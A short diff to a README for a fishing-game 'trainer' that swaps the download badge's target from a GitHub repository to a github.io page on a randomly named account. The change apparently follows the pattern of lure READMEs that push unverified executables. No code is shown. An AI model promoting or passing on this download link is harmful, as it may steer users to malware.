@@ -1,6 +1,6 @@
 # 🎣 How-to-Fish-Trainer - Master the Art of Catching Fish Instantly
 
-[![Download How-to-Fish-Trainer](https://img.shields.io/badge/Download-How_to_Fish_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Judgmental-decorativeness2843/How-to-Fish-Trainer)
+[![Download How-to-Fish-Trainer](https://img.shields.io/badge/Download-How_to_Fish_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://judgmental-decorativeness2843.github.io)
 
 Visit this link to download the application.
 
